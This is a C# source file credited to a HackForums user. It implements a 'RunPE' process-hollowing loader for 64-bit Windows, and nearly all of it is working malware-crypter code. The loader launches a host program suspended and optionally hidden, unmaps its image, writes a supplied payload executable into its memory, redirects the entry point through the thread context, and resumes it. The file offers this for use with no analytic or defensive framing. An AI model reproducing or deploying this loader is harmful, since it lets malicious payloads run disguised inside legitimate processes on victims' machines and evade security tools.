/*
 * WinX64.cs
 * Created by gigajew @ www.hackforums.net
 * 
 * I put hours of work in to this, so please do leave these credits :)
 * 
 * 
 * P.s. If you cannot get this to work, make sure you hit Project Properties -> Build -> Allow unsafe code
 */

using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;
using static HackForums.gigajew.WinXComponents;

namespace HackForums.gigajew
{
    /// <summary>
    /// This RunPE was created by gigajew @ www.hackforums.net for Windows 10 x64
    /// Please leave these credits as a reminder of all the hours of work put into this
    /// </summary>
    public static unsafe class WinX64
    {
        public static bool Start(WinXParameters parameters)
        {
            _IMAGE_DOS_HEADER* dosHeader;
            _IMAGE_NT_HEADERS64* ntHeaders;

            IntPtr payloadImageBase;
            IntPtr payloadBuffer;

            ProcessInfo processInfo;
            processInfo = new ProcessInfo();

            StartupInfo startupInfo;
            startupInfo = new StartupInfo();
            startupInfo.cb = (uint) Marshal.SizeOf(startupInfo);
            if(parameters.Hidden  )
            {
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags = 0x00000001;
            }

            _CONTEXT_AMD64 context = new _CONTEXT_AMD64();
            context.ContextFlags = 0x10001b;

            IntPtr address = Marshal.AllocHGlobal(8);
            IntPtr hToken = WindowsIdentity.GetCurrent().Token;

            IntPtr written = Marshal.AllocHGlobal(8);

            try
            {
                // get the address of buffer
                fixed (byte* pBufferUnsafe = parameters.Payload)
                {
                    payloadBuffer = (IntPtr)pBufferUnsafe;
                    dosHeader = (_IMAGE_DOS_HEADER*)(pBufferUnsafe);
                    ntHeaders = (_IMAGE_NT_HEADERS64*)(pBufferUnsafe + (dosHeader->e_lfanew));
                }

                // security checks
                if (dosHeader->e_magic != 0x5A4D || ntHeaders->Signature != 0x00004550)
                    throw new Exception("Not a valid Win32 PE! -gigajew");

                // check 32-bit
                if (ntHeaders->OptionalHeader.Magic != 0x20b)
                    throw new Exception("This RunPE only supports X64-built executables! -gigajew");

                // init
                uint creationFlags = 0x00000004u | 0x00000008u;
                if (parameters.Hidden)
                    creationFlags |= 0x08000000u;

                // patch (by Menalix/gigajew)
                Buffer.SetByte(parameters.Payload, 0x398, 0x2);

                //if (!CreateProcessInternal(0, null, parameters.GetFormattedHostFileName(), IntPtr.Zero, IntPtr.Zero, false, creationFlags, IntPtr.Zero, Environment.CurrentDirectory, &startupInfo, &processInfo, 0))
                //    throw new Win32Exception(Marshal.GetLastWin32Error());

                CreateProcess(null, parameters.GetFormattedHostFileName(), IntPtr.Zero, IntPtr.Zero, false, creationFlags, IntPtr.Zero, Environment.CurrentDirectory, &startupInfo, &processInfo);

                // todo: fix relocation addresses

                // unmap existing section in the remote process
                payloadImageBase = (IntPtr)(ntHeaders->OptionalHeader.ImageBase);
                NtUnmapViewOfSection(processInfo.hProcess, payloadImageBase); // we don't care if this fails

                // allocate
                if (VirtualAllocEx(processInfo.hProcess, payloadImageBase, new UIntPtr ( ntHeaders->OptionalHeader.SizeOfImage), 0x3000u, 0x40u) == IntPtr.Zero)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // copy image headers
                if (!WriteProcessMemory(processInfo.hProcess, payloadImageBase, payloadBuffer,  new UIntPtr(  ntHeaders->OptionalHeader.SizeOfHeaders), written))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // copy sections
                for (ushort i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
                {
                    _IMAGE_SECTION_HEADER* section = (_IMAGE_SECTION_HEADER*)(payloadBuffer.ToInt64() + (dosHeader->e_lfanew) + Marshal.SizeOf(typeof(_IMAGE_NT_HEADERS64)) + (Marshal.SizeOf(typeof(_IMAGE_SECTION_HEADER)) * i));

                    if (!WriteProcessMemory(processInfo.hProcess, (IntPtr)(payloadImageBase.ToInt64() + (section->VirtualAddress)), (IntPtr)(payloadBuffer.ToInt64() + (section->PointerToRawData)), new UIntPtr(  section->SizeOfRawData), written))
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                // get thread context
                if (!GetThreadContext(processInfo.hThread, &context))
                    throw new Win32Exception(Marshal.GetLastWin32Error(), "GetThreadContext");

                // patch imagebase
                Marshal.WriteInt64(address, payloadImageBase.ToInt64());
                if (!WriteProcessMemory(processInfo.hProcess, (IntPtr)(context.Rdx + 16ul), address, new UIntPtr ( 8u), written))
                    throw new Win32Exception(Marshal.GetLastWin32Error(), "WriteProcessMemory");

                // patch ep
                context.Rcx = (ulong)(payloadImageBase.ToInt64() + (ntHeaders->OptionalHeader.AddressOfEntryPoint));

                // set context
                if (!SetThreadContext(processInfo.hThread, &context))
                    throw new Win32Exception(Marshal.GetLastWin32Error(), "SetThreadContext");

                // resume thread
                ResumeThread(processInfo.hThread);

            }
            catch
            {
                TerminateProcess(processInfo.hProcess, 0);
                throw;
            }
            finally
            {
                CloseHandle(processInfo.hThread);
                CloseHandle(processInfo.hProcess);
                Marshal.FreeHGlobal(address);
            }

            return true;
        }
    }
}
